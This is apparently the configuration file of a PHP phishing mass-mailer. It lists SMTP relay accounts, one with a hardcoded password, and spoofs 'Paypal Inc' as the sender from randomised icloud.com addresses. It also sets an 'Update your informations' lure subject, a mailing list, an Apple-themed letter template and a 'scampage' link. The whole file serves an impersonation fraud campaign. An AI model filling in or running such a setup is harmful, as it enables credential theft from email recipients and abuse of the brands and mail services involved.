<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@cintadiasekali.business",
        "password" => "ipang123"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "USERNAME",
        "password" => "PASSWORD"
    ],
    /*[
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "USERNAME",
        "password" => "PASSWORD"
    ],*/

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 1,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/emaillist.txt",
    "fromname"       => "Paypal Inc",
    "frommail"       => "##randstring##.##randstring##@icloud.com",
    "subject"        => $date . " [ Notification ] Update your informations",
    "msgfile"        => "file/letter/apple.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://google.ly"],
];
